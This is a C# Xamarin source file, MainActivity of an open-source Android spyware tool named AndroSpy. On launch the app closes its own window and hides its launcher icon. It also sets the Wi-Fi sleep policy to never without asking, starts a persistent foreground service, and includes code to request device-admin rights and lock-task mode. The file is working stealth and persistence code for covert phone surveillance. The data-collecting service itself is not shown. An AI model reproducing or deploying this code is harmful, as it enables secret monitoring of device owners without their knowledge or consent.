using Android.App;
using Android.App.Admin;
using Android.Content;
using Android.Content.PM;
using Android.OS;
using Android.Runtime;
using System;
using Xamarin.Essentials;

namespace Task2
{
    /*
     * Project: AndroSpy
     * Date: 20.06.2021
     * Coded By qH0sT' 2021
     * Language: C#.NET
     * AndroSpy is always free and open source.
     * github.com/qH0sT/AndroSpy
    */
    [Activity(Label = "@string/app_name", MainLauncher = true, Icon = "@mipmap/icon", ExcludeFromRecents = true, AlwaysRetainTaskState = true)]

    public class MainActivity : Activity
    {

        private readonly Type SERVICE_TYPE = typeof(ForegroundService);
        private Intent _startServiceIntent;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            Finish();
            hide();
            putWifiSettings(this);
            StartForegroundServiceCompat<ForegroundService>(this, savedInstanceState);
            base.OnCreate(savedInstanceState);
        }
        private void putWifiSettings(Context paramContext)
        {
            try
            {
                //https://developer.android.com/reference/android/provider/Settings.Global#WIFI_SLEEP_POLICY_NEVER
                //0x00000002 WIFI_SLEEP_POLICY_NEVER
                Android.Provider.Settings.System.PutInt(paramContext.ContentResolver,
                    Android.Provider.Settings.System.WifiSleepPolicy,
                    (int)Android.Provider.WifiSleepPolicy.Never);
            }
            catch (Exception) { }
        }
        protected override void OnPause()
        {
            base.OnPause();
        }
        public void hide()
        {
            try
            {
                ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(MainActivity)).Name);
                PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
            }
            catch (Exception) { }
        }

        public const int RequestCodeEnableAdmin = 15;

        protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
        {
            if (requestCode == RequestCodeEnableAdmin)
            {
                PostSetKioskMode(resultCode == Result.Ok);
            }
            else
            {
                base.OnActivityResult(requestCode, resultCode, data);
            }
        }

        public bool SetKioskMode(bool enable)
        {
            var deviceAdmin =
                new ComponentName(this, Java.Lang.Class.FromType(typeof(AdminReceiver)));
            if (enable)
            {
                var intent = new Intent(DevicePolicyManager.ActionAddDeviceAdmin);
                intent.PutExtra(DevicePolicyManager.ExtraDeviceAdmin, deviceAdmin);
                // intent.PutExtra(DevicePolicyManager.ExtraAddExplanation, "activity.getString(R.string.add_admin_extra_app_text");
                StartActivityForResult(intent, RequestCodeEnableAdmin);
                return false;
            }
            else
            {
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                devicePolicyManager.RemoveActiveAdmin(deviceAdmin);
                return true;
            }
        }

        private void PostSetKioskMode(bool enable)
        {
            if (enable)
            {
                var deviceAdmin = new ComponentName(this,
                    Java.Lang.Class.FromType(typeof(AdminReceiver)));
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                if (!devicePolicyManager.IsAdminActive(deviceAdmin)) throw new Exception("Not Admin");

                StartLockTask();
            }
            else
            {
                StopLockTask();
            }
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Permission[] grantResults)
        {
            Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
        private Intent GetIntent(Type type, string action)
        {
            var intent = new Intent(this, type);
            intent.SetAction(action);
            return intent;
        }

        public void StartForegroundServiceCompat<T>(Context context, Bundle args = null) where T : Service
        {
            _startServiceIntent = GetIntent(SERVICE_TYPE, MainValues.ACTION_START_SERVICE);
            if (args != null)
                _startServiceIntent.PutExtras(args);

            if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                context.StartForegroundService(_startServiceIntent);
            else
                context.StartService(_startServiceIntent);
        }
    }
}